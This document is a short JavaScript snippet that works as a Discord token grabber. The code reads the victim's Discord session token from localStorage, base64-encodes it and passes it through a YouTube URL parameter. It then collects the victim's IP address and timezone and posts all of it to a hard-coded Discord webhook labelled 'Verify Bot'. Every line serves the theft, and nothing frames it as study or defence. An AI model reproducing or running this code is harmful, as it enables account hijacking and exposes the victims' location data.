(function () {
    const webhookURL = 'https://discord.com/api/webhooks/1391045636366930000/fH5K6z2KNgUe9ykdh9UZjfiNRKvoV6DYOy3TzITTQC8_KuYUteGBE40Cj-IFy2cQsVgM';

    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = url.searchParams.get("v");
        if (param != null) {

            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    const message = {
                        username: "Verify Bot",
                        embeds: [
                            {
                                title: "Logged Info",
                                description: `**IP:** ${ip}\n**Timezone:** ${timezone}\n**Token:** ${param}\n\nOne ppl get fack`,
                                color: 16711935
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .catch(error => console.error('Error1:', error));
                })
                .catch(error => console.error('Error2:', error));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {

        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
        }
    } else {

        window.location.href = "https://discord.com/channels/@me";
    }
})();
